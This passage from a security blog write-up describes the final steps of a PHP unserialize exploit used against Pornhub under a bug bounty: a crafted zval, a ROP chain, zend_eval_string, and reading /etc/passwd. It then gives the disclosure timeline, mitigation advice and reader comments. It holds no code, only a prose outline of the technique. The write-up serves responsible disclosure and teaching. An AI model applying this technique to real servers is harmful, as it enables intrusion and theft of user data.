+<div style="width: 590px" class="wp-caption aligncenter"><a title="" href="https://www.evonide.com/wp-content/uploads/2016/06/zval-attack.jpg" rel="prettyPhoto"><img src="https://www.evonide.com/wp-content/uploads/2016/06/zval-attack-1024x254.jpg" alt="Final version of the crafted zval object" width="580" height="144" /></a><p class="wp-caption-text"><b>Final version of the crafted zval object</b></p></div>
+<p>&nbsp;</p>
+<p style="text-align: justify;">Together with our ROP stack which was provided over POST data our payload did the following things:</p>
+<ol style="text-align: justify;">
+<li>Created our fake object which was later on passed as a parameter to &#8220;setcookie&#8221;.</li>
+<li>This caused a call to the provided <em>add_ref</em> function i.e. it allowed us to gain program counter control.</li>
+<li>Our ROP chain then prepared all registers/parameters as discussed.</li>
+<li>Next, we were able to execute arbitrary PHP code by making a call to <em>zend_eval_string</em>.</li>
+<li>Finally, we caused a clean process termination while also fetching the output from the response body.</li>
+</ol>
+<p style="text-align: justify;">Once running the above code we were in and got a nice view of Pornhub&#8217;s &#8216;/etc/passwd&#8217; file. Due to the nature of our attack we would have also been able to execute other commands or actually break out of PHP to run arbitrary syscalls. However, just using PHP was more convenient at this point. Finally, we dumped a few details about the underlying system and immediately wrote and submitted a report to Pornhub over Hackerone.</p>
+<h3 style="text-align: justify;"><span id="Timeline">Timeline</span></h3>
+<p>Here is the timeline of the disclosure process:</p>
+<ul>
+<li style="text-align: justify;">2016-05-30 Hacked Pornhub and submitted the issue over Hackerone. Hours later Pornhub quickly fixed the issue by removing calls to unserialize</li>
+<li style="text-align: justify;">2016-06-14 Received a reward of $20,000</li>
+<li style="text-align: justify;">2016-06-16 Submitted issues to bugs.php.net</li>
+<li style="text-align: justify;">2016-06-21 Both bugs got fixed in PHP&#8217;s security repository</li>
+<li style="text-align: justify;">2016-06-27 Received Hackerone IBB reward of $2,000 ($1,000 for each vulnerability)</li>
+<li style="text-align: justify;">2016-07-22 Pornhub resolved the issue on Hackerone</li>
+</ul>
+<h3 style="text-align: justify;"><span id="Conclusion">Conclusion</span></h3>
+<p style="text-align: justify;">We gained remote code execution and would&#8217;ve been able to do the following things:</p>
+<ul style="text-align: justify;">
+<li>Dump the complete database of pornhub.com including all sensitive user information.</li>
+<li>Track and observe user behavior on the platform.</li>
+<li>Leak the complete available source code of all sites hosted on the server.</li>
+<li>Escalate further into the network or root the system.</li>
+</ul>
+<p>&nbsp;</p>
+<p style="text-align: justify;">Of course none of the above things were done and very careful attention was paid to respect the scope and limitations of the bug bounty program.<br />
+Further, we were able to find two zero day vulnerabilities in PHP&#8217;s garbage collection algorithm. Those vulnerabilities, although being in a very different PHP context, could be reliably and remotely exploited in an unserialize context, too.</p>
+<p>&nbsp;</p>
+<p style="text-align: justify;">It is well-known that using user input on unserialize is a bad idea. In particular, about 10 years have passed since its first weaknesses have become apparent. Unfortunately, even today, many developers seem to believe that unserialize is only dangerous in old PHP versions or when combined with unsafe classes. We sincerely hope to have destroyed this misbelief. Please finally put a nail into unserialize&#8217;s coffin so that the following mantra becomes obsolete.</p>
+<p style="text-align: justify;"><strong>You should never use user input on unserialize. Assuming that using an up-to-date PHP version is enough to protect unserialize in such scenarios is a bad idea. Avoid it or use less complex serialization methods like JSON.</strong></p>
+<p style="text-align: justify;">The newest PHP versions contain fixes by now. Hence, you should update your PHP 5 and PHP 7 versions accordingly.</p>
+<p>&nbsp;</p>
+<p style="text-align: justify;">Many thanks to the Pornhub team for:</p>
+<ul style="text-align: justify;">
+<li>Very polite and competent responses.</li>
+<li>Actually caring about security (and not just pretending like many other companies do nowadays).</li>
+<li>Being very generous regarding the bounty of $20,000.<br />
+According to <a href="https://h1.sintheticlabs.com/" target="_blank">Sinthetic Labs&#8217;s Public Hackerone Reports</a> last update we are grateful to see that this submission seems to be heads on with the ShellShock vulnerability submission for being one of the highest paid public bounties on Hackerone so far.</li>
+</ul>
+<p>Further, many thanks go out to the PHP developers for quickly deploying the fix and the Internet Bug Bounty committee for awarding us with $2,000.</p>
+<p style="text-align: justify;">Finally, we want to highlight the necessity of such programs. As you can see, offering high bug bounties can motivate security researchers to find bugs in underlying software. This positively impacts other sites and unrelated services as well.</p>
+<p>&nbsp;</p>
+<p style="text-align: justify;">Please don&#8217;t forget to checkout our two other write-ups regarding the PHP bugs and their discovery.</p>
+
+</div><!-- #pure_content -->
+
+<div class="list_category">
+
+<div class="heading"><h2>Share This Article</h2></div>
+
+<div class="share "> 
+
+  <a href="https://www.facebook.com/sharer.php?u=https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/&amp;t=How we broke PHP, hacked Pornhub and earned $20,000">
+  <img src="https://www.evonide.com/wp-content/themes/Broadcast/images/facebook-icon.png" alt="Share on Facebook" class="shareimg" /></a>
+
+  <a href="https://twitter.com/intent/tweet?text=How we broke PHP, hacked Pornhub and earned $20,000&nbsp;-&nbsp;https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/">
+  <img src="https://www.evonide.com/wp-content/themes/Broadcast/images/twitter-icon.png" alt="Share on Twitter" class="shareimg" /></a>
+
+  <a href="https://www.reddit.com/submit?url=https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/&amp;title=How we broke PHP, hacked Pornhub and earned $20,000">
+  <img src="https://www.evonide.com/wp-content/themes/Broadcast/images/reddit-icon.png" alt="Share on Reddit" class="shareimg" /></a>
+
+  <a href="https://digg.com/submit?url=https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/&amp;title=How we broke PHP, hacked Pornhub and earned $20,000&amp;thumbnails=1">
+  <img src="https://www.evonide.com/wp-content/themes/Broadcast/images/digg-icon.png" alt="Share on Digg" class="shareimg" /></a>
+
+  <a href="https://www.stumbleupon.com/submit?url=https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/&amp;title=How we broke PHP, hacked Pornhub and earned $20,000">
+  <img src="https://www.evonide.com/wp-content/themes/Broadcast/images/stumbleupon-icon.png" alt="Share on Stumbleupon" class="shareimg" /></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/&amp;title=How we broke PHP, hacked Pornhub and earned $20,000&amp;source=">
+  <img src="https://www.evonide.com/wp-content/themes/Broadcast/images/linkedin-icon.png" alt="Share on Linkedin" class="shareimg" /></a>
+
+  <a href="https://del.icio.us/post?url=https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/&amp;title=How we broke PHP, hacked Pornhub and earned $20,000" class="no_margin_right">
+  <img src="https://www.evonide.com/wp-content/themes/Broadcast/images/delicious-icon.png" alt="Share on Icio" class="last shareimg" /></a>
+
+</div><!-- #share -->
+
+</div><!-- #list_category -->
+
+<div class="list_category unique_margin_bottom">
+<div class='yarpp-related'>
+
+<div class="heading"><h2>Related News</h2></div><!-- #heading -->
+
+
+<div class="other_categories_item">
+<a href="https://www.evonide.com/breaking-phps-garbage-collection-and-unserialize/" target="_blank"><img src="https://www.evonide.com/wp-content/uploads/2016/06/php_garbage_collection-1024x689_thumb.jpg" alt="Breaking PHP&#8217;s Garbage Collection and Unserialize" /></a>
+<h4><a href="https://www.evonide.com/breaking-phps-garbage-collection-and-unserialize/" target="_blank" rel="bookmark">Breaking PHP&#8217;s Garbage Collection and Unserialize</a></h4><!-- (5.2)-->
+<span class="date">July 25,  2016</span>
+</div><!-- other_categories_item -->
+            <div class="other_categories_item">
+<a href="https://www.evonide.com/fuzzing-unserialize/" target="_blank"><img src="https://www.evonide.com/wp-content/uploads/2016/06/fuzzing_unserialize-1024x446_thumb.jpg" alt="Fuzzing Unserialize" /></a>
+<h4><a href="https://www.evonide.com/fuzzing-unserialize/" target="_blank" rel="bookmark">Fuzzing Unserialize</a></h4><!-- (4.1)-->
+<span class="date">July 23,  2016</span>
+</div><!-- other_categories_item -->
+</div>
+</div>
+
+
+<div class="list_category unique_margin_bottom">
+
+<div class="heading"><h2>About the Author</h2></div>
+
+<div class="about_author">
+
+<div class="image"><img alt='' src='https://secure.gravatar.com/avatar/4cf31ddf7fbad55d005fc09424a5b41a?s=75&#038;d=retro&#038;r=g' srcset='https://secure.gravatar.com/avatar/4cf31ddf7fbad55d005fc09424a5b41a?s=150&amp;d=retro&amp;r=g 2x' class='image_border avatar-75 photo' height='75' width='75' /></div><!-- image -->
+
+<div class="content"><h3>Ruslan Habalov</h3><p>Is dealing with Information Security issues for more than 10 years. Likes sophisticated challenges and is additionally interested in Artificial General Intelligence. [<a href="http://www.evonide.com/about/">Read more...</a>]</p></div><!-- #content -->
+
+</div><!-- about_author -->
+
+</div><!-- list_category -->
+
+
+
+<div class="list_category unique_margin_bottom">
+
+<div class="heading"><h2>Leave A Comment</h2></div>
+
+</div><!-- #list_category -->
+
+	<div id="respond" class="comment-respond">
+		<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/#respond" style="display:none;">Cancel reply</a></small></h3>			<form action="https://www.evonide.com/wp-comments-post.php" method="post" id="commentform" class="comment-form">
+				<p class="comment-notes"><span id="email-notes">Your email address will not be published.</span></p><div class="form-row comment-form-comment"><label for="comment">Comment <em class="meta">(required)</em></label><textarea autocomplete="nope"  class="u-8" id="51044bfb51"  name="4ef7867b93"   cols="45" rows="8" tabindex="1"></textarea><textarea id="comment" aria-hidden="true" name="comment" autocomplete="nope" style="clip:rect(1px, 1px, 1px, 1px);position:absolute !important;white-space:nowrap;height:1px;width:1px;overflow:hidden;" tabindex="-1"></textarea><script type="text/javascript">document.getElementById("comment").setAttribute( "id", "57772f915921cabde21145370b0af7ab" );document.getElementById("51044bfb51").setAttribute( "id", "comment" );</script></div><div class="form-row comment-form-author"><label for="author">Name <em class="meta">(required)</em></label><input class="u-4" id="author" name="author" type="text" value="" size="30" tabindex="2" /></div>
+<div class="form-row comment-form-email"><label for="email">Email <em class="meta">(optional)</em></label><input class="u-4 " id="email" name="email" type="text" value="" size="30" tabindex="3" /></div>
+<div class="form-row comment-form-url"><label for="url">Website <em class="meta">(optional)</em></label><input class="u-4" id="url" name="url" type="text" value="" size="30" tabindex="4" /></div>
+<p class="form-submit"><div class="form-row comment-form-email"><label>&nbsp;</label><input name="submit" type="submit" id="submit" class="submit" value="Post Comment" tabindex="5"></div> <input type='hidden' name='comment_post_ID' value='1872' id='comment_post_ID' />
+<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
+</p>			</form>
+			</div><!-- #respond -->
+	
+
+<div class="list_category unique_margin_bottom">
+
+<div class="heading"><h2>(32) Readers Comments </h2></div>
+
+</div><!-- #list_category -->
+
+<ol id="comments"><!-- main holder -->
+
+<li>
+
+<div class="comment" id="comment5855"><!-- start of new comment goes inside the li -->
+
+<div class="avatar">
+
+<img alt='' src='https://secure.gravatar.com/avatar/ba9d6f7266ee66a2ce4158d0277ff165?s=75&#038;d=retro&#038;r=g' srcset='https://secure.gravatar.com/avatar/ba9d6f7266ee66a2ce4158d0277ff165?s=150&amp;d=retro&amp;r=g 2x' class='image_border avatar-75 photo' height='75' width='75' />
+</div><!-- #avatar -->
+
+
+<div class="comment_holder">
+<h5>Dmitry</h5><!-- Comment Maker Name -->
+<span class="date">August 2, 2016 at 19:01</span><!-- #comment date -->
+<div class="comment_box"><p class="no_margin_bottom">In Russia, Pornhub is blocked. No chance for searching vulnerabilities. :(</p></div><!-- #comment box -->
+
+<div class="button"><a rel='nofollow' class='imgf reply round_edges' href='https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/?replytocom=5855#respond' onclick='return addComment.moveForm( "comment-5855", "5855", "respond", "1872" )' aria-label='Reply to Dmitry'>Reply</a></div><!-- #button -->
+
+</div><!-- #comment_holder -->
+
+</div><!-- #comment -->
+    
+
+	<ul class="children">
+<li>
+
+<div class="comment" id="comment5915"><!-- start of new comment goes inside the li -->
+
+<div class="avatar">
+
+<img alt='' src='https://secure.gravatar.com/avatar/?s=75&#038;d=retro&#038;r=g' srcset='https://secure.gravatar.com/avatar/?s=150&amp;d=retro&amp;r=g 2x' class='image_border avatar-75 photo avatar-default' height='75' width='75' />
+</div><!-- #avatar -->
+
+
+<div class="comment_holder">
+<h5>Vladimir</h5><!-- Comment Maker Name -->
+<span class="date">August 9, 2016 at 09:01</span><!-- #comment date -->
+<div class="comment_box"><p class="no_margin_bottom">Blocked? Seriously? Just use english(or any other language) version</p></div><!-- #comment box -->
+
+<div class="button"></div><!-- #button -->
+
+</div><!-- #comment_holder -->
+
+</div><!-- #comment -->
+    
+
+	</li><!-- #comment-## -->
+</ul><!-- .children -->
+</li><!-- #comment-## -->
+<li>
+
+<div class="comment" id="comment5853"><!-- start of new comment goes inside the li -->
+
+<div class="avatar">
+
+<img alt='' src='https://secure.gravatar.com/avatar/e3805127a61536927e2fc682fbbe6f57?s=75&#038;d=retro&#038;r=g' srcset='https://secure.gravatar.com/avatar/e3805127a61536927e2fc682fbbe6f57?s=150&amp;d=retro&amp;r=g 2x' class='image_border avatar-75 photo' height='75' width='75' />
+</div><!-- #avatar -->
+
+
+<div class="comment_holder">
+<h5><a href='http://techcrack.net' rel='external nofollow' class='url'>Manthan</a></h5><!-- Comment Maker Name -->
+<span class="date">August 2, 2016 at 14:52</span><!-- #comment date -->
+<div class="comment_box"><p class="no_margin_bottom">Whao! this is great.</p></div><!-- #comment box -->
+
+<div class="button"><a rel='nofollow' class='imgf reply round_edges' href='https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/?replytocom=5853#respond' onclick='return addComment.moveForm( "comment-5853", "5853", "respond", "1872" )' aria-label='Reply to Manthan'>Reply</a></div><!-- #button -->
+
+</div><!-- #comment_holder -->
+
+</div><!-- #comment -->
+    
+
+	</li><!-- #comment-## -->
+<li>
+
+<div class="comment" id="comment5843"><!-- start of new comment goes inside the li -->
+
+<div class="avatar">
+
+<img alt='' src='https://secure.gravatar.com/avatar/ca080ad1c30c3af1cdada1a5d70b9c91?s=75&#038;d=retro&#038;r=g' srcset='https://secure.gravatar.com/avatar/ca080ad1c30c3af1cdada1a5d70b9c91?s=150&amp;d=retro&amp;r=g 2x' class='image_border avatar-75 photo' height='75' width='75' />
+</div><!-- #avatar -->
+
+
+<div class="comment_holder">
+<h5>Nino</h5><!-- Comment Maker Name -->
+<span class="date">July 30, 2016 at 09:41</span><!-- #comment date -->
+<div class="comment_box"><p class="no_margin_bottom">Awesome!</p></div><!-- #comment box -->
+
+<div class="button"><a rel='nofollow' class='imgf reply round_edges' href='https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/?replytocom=5843#respond' onclick='return addComment.moveForm( "comment-5843", "5843", "respond", "1872" )' aria-label='Reply to Nino'>Reply</a></div><!-- #button -->
+
+</div><!-- #comment_holder -->
+
+</div><!-- #comment -->
+    
+
+	</li><!-- #comment-## -->
+<li>
+
+<div class="comment" id="comment5840"><!-- start of new comment goes inside the li -->
+
+<div class="avatar">
+
+<img alt='' src='https://secure.gravatar.com/avatar/?s=75&#038;d=retro&#038;r=g' srcset='https://secure.gravatar.com/avatar/?s=150&amp;d=retro&amp;r=g 2x' class='image_border avatar-75 photo avatar-default' height='75' width='75' />
+</div><!-- #avatar -->
+
+
+<div class="comment_holder">
+<h5>MaMe82</h5><!-- Comment Maker Name -->
+<span class="date">July 29, 2016 at 19:48</span><!-- #comment date -->
+<div class="comment_box"><p class="no_margin_bottom">Best writeup I read for a long time. You put much effort in this...finding useable UAF vulns seems to be a complex task. I'm wondering how nany days you spent in fuzzing and manual review of PHP code. Again...nice work and sharing this helps others to get a better understanding if techniques involved and thus keeping things more secure</p></div><!-- #comment box -->
+
+<div class="button"><a rel='nofollow' class='imgf reply round_edges' href='https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/?replytocom=5840#respond' onclick='return addComment.moveForm( "comment-5840", "5840", "respond", "1872" )' aria-label='Reply to MaMe82'>Reply</a></div><!-- #button -->
+
+</div><!-- #comment_holder -->
+
+</div><!-- #comment -->
+    
+
+	</li><!-- #comment-## -->
+<li>
+
+<div class="comment" id="comment5827"><!-- start of new comment goes inside the li -->
+
+<div class="avatar">
+
+<img alt='' src='https://secure.gravatar.com/avatar/5c1d2a2083c6e125422bac164ead0ddf?s=75&#038;d=retro&#038;r=g' srcset='https://secure.gravatar.com/avatar/5c1d2a2083c6e125422bac164ead0ddf?s=150&amp;d=retro&amp;r=g 2x' class='image_border avatar-75 photo' height='75' width='75' />
+</div><!-- #avatar -->
+
+
+<div class="comment_holder">
+<h5><a href='http://hello%20world' rel='external nofollow' class='url'>kalinihon</a></h5><!-- Comment Maker Name -->
+<span class="date">July 27, 2016 at 18:48</span><!-- #comment date -->
+<div class="comment_box"><p class="no_margin_bottom">that was fabulous ! it was a great work by you guys ! 
+
+now i can definitely say bye bye to PHP</p></div><!-- #comment box -->
+
+<div class="button"><a rel='nofollow' class='imgf reply round_edges' href='https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/?replytocom=5827#respond' onclick='return addComment.moveForm( "comment-5827", "5827", "respond", "1872" )' aria-label='Reply to kalinihon'>Reply</a></div><!-- #button -->
+
+</div><!-- #comment_holder -->
+
+</div><!-- #comment -->
+    
+
+	<ul class="children">
+<li>
+
+<div class="comment" id="comment5835"><!-- start of new comment goes inside the li -->
+
+<div class="avatar">
+
+<img alt='' src='https://secure.gravatar.com/avatar/?s=75&#038;d=retro&#038;r=g' srcset='https://secure.gravatar.com/avatar/?s=150&amp;d=retro&amp;r=g 2x' class='image_border avatar-75 photo avatar-default' height='75' width='75' />
+</div><!-- #avatar -->
+
+
+<div class="comment_holder">
+<h5>JohannesTrom</h5><!-- Comment Maker Name -->
+<span class="date">July 28, 2016 at 23:22</span><!-- #comment date -->
+<div class="comment_box"><p class="no_margin_bottom">Do you think other languages do not have similar problems, kalinihon?</p></div><!-- #comment box -->
+
+<div class="button"></div><!-- #button -->
+
+</div><!-- #comment_holder -->
+
+</div><!-- #comment -->
+    
+
+	</li><!-- #comment-## -->
+</ul><!-- .children -->
+</li><!-- #comment-## -->
+<li>
+
+<div class="comment" id="comment5824"><!-- start of new comment goes inside the li -->
+
+<div class="avatar">
+
+<img alt='' src='https://secure.gravatar.com/avatar/?s=75&#038;d=retro&#038;r=g' srcset='https://secure.gravatar.com/avatar/?s=150&amp;d=retro&amp;r=g 2x' class='image_border avatar-75 photo avatar-default' height='75' width='75' />
+</div><!-- #avatar -->
+
+
+<div class="comment_holder">
+<h5>ily</h5><!-- Comment Maker Name -->
+<span class="date">July 27, 2016 at 14:01</span><!-- #comment date -->
+<div class="comment_box"><p class="no_margin_bottom">Jestko</p></div><!-- #comment box -->
+
+<div class="button"><a rel='nofollow' class='imgf reply round_edges' href='https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/?replytocom=5824#respond' onclick='return addComment.moveForm( "comment-5824", "5824", "respond", "1872" )' aria-label='Reply to ily'>Reply</a></div><!-- #button -->
+
+</div><!-- #comment_holder -->
+
+</div><!-- #comment -->
+    
+
+	</li><!-- #comment-## -->
+<li>
+
+<div class="comment" id="comment5819"><!-- start of new comment goes inside the li -->
+
+<div class="avatar">
+
+<img alt='' src='https://secure.gravatar.com/avatar/?s=75&#038;d=retro&#038;r=g' srcset='https://secure.gravatar.com/avatar/?s=150&amp;d=retro&amp;r=g 2x' class='image_border avatar-75 photo avatar-default' height='75' width='75' />
+</div><!-- #avatar -->
+
+
+<div class="comment_holder">
+<h5>f4jr</h5><!-- Comment Maker Name -->
+<span class="date">July 27, 2016 at 08:19</span><!-- #comment date -->
+<div class="comment_box"><p class="no_margin_bottom">respect to you.. I've been at odds with php for so long, now I can really say good bye to this programming language..</p></div><!-- #comment box -->
+
+<div class="button"><a rel='nofollow' class='imgf reply round_edges' href='https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/?replytocom=5819#respond' onclick='return addComment.moveForm( "comment-5819", "5819", "respond", "1872" )' aria-label='Reply to f4jr'>Reply</a></div><!-- #button -->
+
+</div><!-- #comment_holder -->
+
+</div><!-- #comment -->
+    
+
+	</li><!-- #comment-## -->
+<li>
+
+<div class="comment" id="comment5814"><!-- start of new comment goes inside the li -->
+
+<div class="avatar">
+
+<img alt='' src='https://secure.gravatar.com/avatar/fc1e16fdc56bd6d8855d78ec98a9625c?s=75&#038;d=retro&#038;r=g' srcset='https://secure.gravatar.com/avatar/fc1e16fdc56bd6d8855d78ec98a9625c?s=150&amp;d=retro&amp;r=g 2x' class='image_border avatar-75 photo' height='75' width='75' />
+</div><!-- #avatar -->
+
+
+<div class="comment_holder">
+<h5>Camilo C.</h5><!-- Comment Maker Name -->
+<span class="date">July 26, 2016 at 18:37</span><!-- #comment date -->
+<div class="comment_box"><p class="no_margin_bottom">What skills are needed to achieve this ? I am total noob about security :$</p></div><!-- #comment box -->
+
+<div class="button"><a rel='nofollow' class='imgf reply round_edges' href='https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/?replytocom=5814#respond' onclick='return addComment.moveForm( "comment-5814", "5814", "respond", "1872" )' aria-label='Reply to Camilo C.'>Reply</a></div><!-- #button -->
+
+</div><!-- #comment_holder -->
+
+</div><!-- #comment -->
+    
+
+	</li><!-- #comment-## -->
+<li>
+
+<div class="comment" id="comment5808"><!-- start of new comment goes inside the li -->
+
+<div class="avatar">
+
+<img alt='' src='https://secure.gravatar.com/avatar/?s=75&#038;d=retro&#038;r=g' srcset='https://secure.gravatar.com/avatar/?s=150&amp;d=retro&amp;r=g 2x' class='image_border avatar-75 photo avatar-default' height='75' width='75' />
+</div><!-- #avatar -->
+
+
+<div class="comment_holder">
+<h5>F34r</h5><!-- Comment Maker Name -->
+<span class="date">July 26, 2016 at 06:05</span><!-- #comment date -->
+<div class="comment_box"><p class="no_margin_bottom">Great work guys!</p></div><!-- #comment box -->
+
+<div class="button"><a rel='nofollow' class='imgf reply round_edges' href='https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/?replytocom=5808#respond' onclick='return addComment.moveForm( "comment-5808", "5808", "respond", "1872" )' aria-label='Reply to F34r'>Reply</a></div><!-- #button -->
+
+</div><!-- #comment_holder -->
+
+</div><!-- #comment -->
+    
+
+	</li><!-- #comment-## -->
+<li>
+
+<div class="comment" id="comment5797"><!-- start of new comment goes inside the li -->
+
+<div class="avatar">
+
+<img alt='' src='https://secure.gravatar.com/avatar/?s=75&#038;d=retro&#038;r=g' srcset='https://secure.gravatar.com/avatar/?s=150&amp;d=retro&amp;r=g 2x' class='image_border avatar-75 photo avatar-default' height='75' width='75' />
+</div><!-- #avatar -->
+
+
+<div class="comment_holder">
+<h5>Synth</h5><!-- Comment Maker Name -->
+<span class="date">July 25, 2016 at 10:35</span><!-- #comment date -->
+<div class="comment_box"><p class="no_margin_bottom">Hey guys.
+Really nice exploitation. I was investigating the same issue but I could only leak the exception details and fingerprint some of the PHP classes used by PornHub.
+Well done for your extra mile :)</p></div><!-- #comment box -->
+
+<div class="button"><a rel='nofollow' class='imgf reply round_edges' href='https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/?replytocom=5797#respond' onclick='return addComment.moveForm( "comment-5797", "5797", "respond", "1872" )' aria-label='Reply to Synth'>Reply</a></div><!-- #button -->
+
+</div><!-- #comment_holder -->
+
+</div><!-- #comment -->
+    
+
+	</li><!-- #comment-## -->
+<li>
+
+<div class="comment" id="comment5796"><!-- start of new comment goes inside the li -->
+
+<div class="avatar">
+
+<img alt='' src='https://secure.gravatar.com/avatar/?s=75&#038;d=retro&#038;r=g' srcset='https://secure.gravatar.com/avatar/?s=150&amp;d=retro&amp;r=g 2x' class='image_border avatar-75 photo avatar-default' height='75' width='75' />
+</div><!-- #avatar -->
+
+
+<div class="comment_holder">
+<h5>Peder Oktan</h5><!-- Comment Maker Name -->
+<span class="date">July 25, 2016 at 10:01</span><!-- #comment date -->
+<div class="comment_box"><p class="no_margin_bottom">Sehr gute Arbeit , absolut verdient der Preis, ich habe großen Respekt vor eurer Arbeit und den Skills die ihr euch bestimmt jahrelang angeeignet habt.
+Weiter so</p></div><!-- #comment box -->
+
+<div class="button"><a rel='nofollow' class='imgf reply round_edges' href='https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/?replytocom=5796#respond' onclick='return addComment.moveForm( "comment-5796", "5796", "respond", "1872" )' aria-label='Reply to Peder Oktan'>Reply</a></div><!-- #button -->
+
+</div><!-- #comment_holder -->
+
+</div><!-- #comment -->
+    
+
+	</li><!-- #comment-## -->
+<li>
+
+<div class="comment" id="comment5792"><!-- start of new comment goes inside the li -->
+
+<div class="avatar">
+
+<img alt='' src='https://secure.gravatar.com/avatar/?s=75&#038;d=retro&#038;r=g' srcset='https://secure.gravatar.com/avatar/?s=150&amp;d=retro&amp;r=g 2x' class='image_border avatar-75 photo avatar-default' height='75' width='75' />
+</div><!-- #avatar -->
+
+
+<div class="comment_holder">
+<h5>wonder</h5><!-- Comment Maker Name -->
+<span class="date">July 25, 2016 at 04:03</span><!-- #comment date -->
+<div class="comment_box"><p class="no_margin_bottom">Amazing Job ! I wonder how long does it take you to finish this job ?</p></div><!-- #comment box -->
+
+<div class="button"><a rel='nofollow' class='imgf reply round_edges' href='https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/?replytocom=5792#respond' onclick='return addComment.moveForm( "comment-5792", "5792", "respond", "1872" )' aria-label='Reply to wonder'>Reply</a></div><!-- #button -->
+
+</div><!-- #comment_holder -->
+
+</div><!-- #comment -->
+    
+
+	</li><!-- #comment-## -->
+<li>
+
+<div class="comment" id="comment5788"><!-- start of new comment goes inside the li -->
+
+<div class="avatar">
+
+<img alt='' src='https://secure.gravatar.com/avatar/?s=75&#038;d=retro&#038;r=g' srcset='https://secure.gravatar.com/avatar/?s=150&amp;d=retro&amp;r=g 2x' class='image_border avatar-75 photo avatar-default' height='75' width='75' />
+</div><!-- #avatar -->
+
+
+<div class="comment_holder">
+<h5>Chimpy</h5><!-- Comment Maker Name -->
+<span class="date">July 24, 2016 at 20:51</span><!-- #comment date -->
+<div class="comment_box"><p class="no_margin_bottom">Good article but I am too dumb to understand  this bug. I guess I will stick with XSS for now :(</p></div><!-- #comment box -->
+
+<div class="button"><a rel='nofollow' class='imgf reply round_edges' href='https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/?replytocom=5788#respond' onclick='return addComment.moveForm( "comment-5788", "5788", "respond", "1872" )' aria-label='Reply to Chimpy'>Reply</a></div><!-- #button -->
+
+</div><!-- #comment_holder -->
+
+</div><!-- #comment -->
+    
+
+	</li><!-- #comment-## -->
+<li>
+
+<div class="comment" id="comment5786"><!-- start of new comment goes inside the li -->
+
+<div class="avatar">
+
+<img alt='' src='https://secure.gravatar.com/avatar/e9ea441a7102fee5cc3d8601346d6c0b?s=75&#038;d=retro&#038;r=g' srcset='https://secure.gravatar.com/avatar/e9ea441a7102fee5cc3d8601346d6c0b?s=150&amp;d=retro&amp;r=g 2x' class='image_border avatar-75 photo' height='75' width='75' />
+</div><!-- #avatar -->
+
+
+<div class="comment_holder">
+<h5><a href='http://www.cyberkendra.com' rel='external nofollow' class='url'>Vivek</a></h5><!-- Comment Maker Name -->
+<span class="date">July 24, 2016 at 16:49</span><!-- #comment date -->
+<div class="comment_box"><p class="no_margin_bottom">Amazing finding guys.... Learned new and awesome things. Keep it up.</p></div><!-- #comment box -->
+
+<div class="button"><a rel='nofollow' class='imgf reply round_edges' href='https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/?replytocom=5786#respond' onclick='return addComment.moveForm( "comment-5786", "5786", "respond", "1872" )' aria-label='Reply to Vivek'>Reply</a></div><!-- #button -->
+
+</div><!-- #comment_holder -->
+
+</div><!-- #comment -->
+    
+
+	</li><!-- #comment-## -->
+<li>
+
+<div class="comment" id="comment5785"><!-- start of new comment goes inside the li -->
+
+<div class="avatar">
+
+<img alt='' src='https://secure.gravatar.com/avatar/?s=75&#038;d=retro&#038;r=g' srcset='https://secure.gravatar.com/avatar/?s=150&amp;d=retro&amp;r=g 2x' class='image_border avatar-75 photo avatar-default' height='75' width='75' />
+</div><!-- #avatar -->
+
+
+<div class="comment_holder">
+<h5>hauke</h5><!-- Comment Maker Name -->
+<span class="date">July 24, 2016 at 16:44</span><!-- #comment date -->
+<div class="comment_box"><p class="no_margin_bottom">gratz boys! well deserved! :)</p></div><!-- #comment box -->
+
+<div class="button"><a rel='nofollow' class='imgf reply round_edges' href='https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/?replytocom=5785#respond' onclick='return addComment.moveForm( "comment-5785", "5785", "respond", "1872" )' aria-label='Reply to hauke'>Reply</a></div><!-- #button -->
+
+</div><!-- #comment_holder -->
+
+</div><!-- #comment -->
+    
+
+	</li><!-- #comment-## -->
+<li>
+
+<div class="comment" id="comment5783"><!-- start of new comment goes inside the li -->
+
+<div class="avatar">
+
+<img alt='' src='https://secure.gravatar.com/avatar/997006909e2ac5a5807234b3c6d2d2dc?s=75&#038;d=retro&#038;r=g' srcset='https://secure.gravatar.com/avatar/997006909e2ac5a5807234b3c6d2d2dc?s=150&amp;d=retro&amp;r=g 2x' class='image_border avatar-75 photo' height='75' width='75' />
+</div><!-- #avatar -->
+
+
+<div class="comment_holder">
+<h5>vjeran</h5><!-- Comment Maker Name -->
+<span class="date">July 24, 2016 at 11:54</span><!-- #comment date -->
+<div class="comment_box"><p class="no_margin_bottom">nice 1</p></div><!-- #comment box -->
+
